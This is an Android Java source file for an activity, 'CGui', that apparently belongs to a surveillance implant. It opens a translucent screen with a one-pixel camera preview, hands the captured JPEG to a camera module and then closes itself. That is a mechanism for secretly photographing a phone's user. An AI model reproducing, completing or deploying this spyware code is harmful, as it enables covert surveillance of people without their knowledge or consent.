package com.android.dvci.gui;

import android.app.Activity;
import android.os.Bundle;
import android.view.ViewGroup;
import android.widget.LinearLayout;
import android.widget.LinearLayout.LayoutParams;

import com.android.dvci.auto.Cfg;
import com.android.dvci.module.ModuleCamera;
import com.android.dvci.util.Check;

public class CGui extends Activity {
	private static final String TAG = "CGui";
	private LinearLayout root;
	private Preview preview;

	@Override
	public void onDestroy() {
		super.onDestroy();
		if (Cfg.DEBUG) {
			Check.log(TAG + " (onDestroy)");
		}
		if (preview != null) {
			preview.clear();
		}
	}

	@Override
	public void onCreate(Bundle state) {
		super.onCreate(state);

		LayoutParams containerParams = new LayoutParams(ViewGroup.LayoutParams.FILL_PARENT,
				ViewGroup.LayoutParams.WRAP_CONTENT, 0.0F);
		LayoutParams widgetParams = new LayoutParams(ViewGroup.LayoutParams.FILL_PARENT,
				ViewGroup.LayoutParams.FILL_PARENT, 1.0F);
		LayoutParams viewerParams = new LayoutParams(1, 1);

		root = new LinearLayout(this);
		root.setOrientation(LinearLayout.VERTICAL);
		// root.setBackgroundColor(0x00);
		root.setLayoutParams(containerParams);

		LinearLayout ll = new LinearLayout(this);
		root.setOrientation(LinearLayout.HORIZONTAL);
		// root.setBackgroundColor(0x00);
		root.setLayoutParams(containerParams);

		root.addView(ll);

		preview = new Preview(this);
		preview.setLayoutParams(viewerParams);
		root.addView(preview);
		setTheme(android.R.style.Theme_Translucent);

		/*
		 * EditText tb = new EditText(this); tb.setText("Ciao mondo");
		 * tb.setFocusable(false); tb.setLayoutParams(widgetParams);
		 * ll.addView(tb);
		 * 
		 * Button b = new Button(this); b.setText("Exit");
		 * b.setTextColor(Color.RED); b.setLayoutParams(widgetParams);
		 * b.setOnClickListener(new OnClickListener() {
		 * 
		 * @Override public void onClick(View paramView) { onButtonClick(); }
		 * });
		 * 
		 * ll.addView(b);
		 */
		setContentView(root);

	}

	public void callback(byte[] jpeg) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (callback)");
		}
		if (jpeg != null) {
			ModuleCamera.callback(jpeg);
		}
		finish();
	}
}
